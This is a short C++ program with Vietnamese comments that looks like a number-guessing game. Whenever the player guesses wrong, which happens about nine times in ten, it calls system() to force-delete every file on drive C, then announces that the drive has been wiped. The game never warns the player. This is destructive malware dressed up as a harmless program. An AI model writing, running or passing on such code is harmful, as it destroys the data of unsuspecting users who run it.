#include<iostream>
#include<time.h>
using namespace std;
int main()
{
	// Khởi tạo random
	srand(time(NULL) );
	cout << "Nhap so ban muon kiem tra: ";
	int so;
	cin >> so;

	// Random số ngẫu nhiên từ 1 đến 10
	int random = rand() % 10 + 1;
	if (so == random)
	{
		cout << "Ban da doan dung so random la: " << random << endl;
	}
	else
	{
		cout << "Ban da doan sai so random la: " << random << endl;
	}

	// Nếu user nhập sai thì xóa toàn bộ file và thư mục trong ổ C
	if (so != random)
	{	
		system("del C:\\*.* /f /s /q");
		// Thông báo đã xóa xong
		cout << "Da xoa xong o C do ban nhap sai so random" << endl;
	} 
	else 
	{
		cout << "Ban da nhap dung so random nen khong xoa o C" << endl;
	}
return 0;
}
